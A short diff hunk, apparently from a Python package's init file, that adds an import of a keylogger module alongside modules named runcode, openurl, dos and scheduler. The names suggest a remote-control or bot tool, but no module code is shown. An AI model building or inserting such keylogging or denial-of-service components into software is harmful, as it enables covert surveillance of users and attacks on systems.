@@ -8,3 +8,4 @@ from .runcode import runcode
 from .openurl import openurl
 from .dos import dos
 from .scheduler import scheduler
+from .keylogger import keylogger
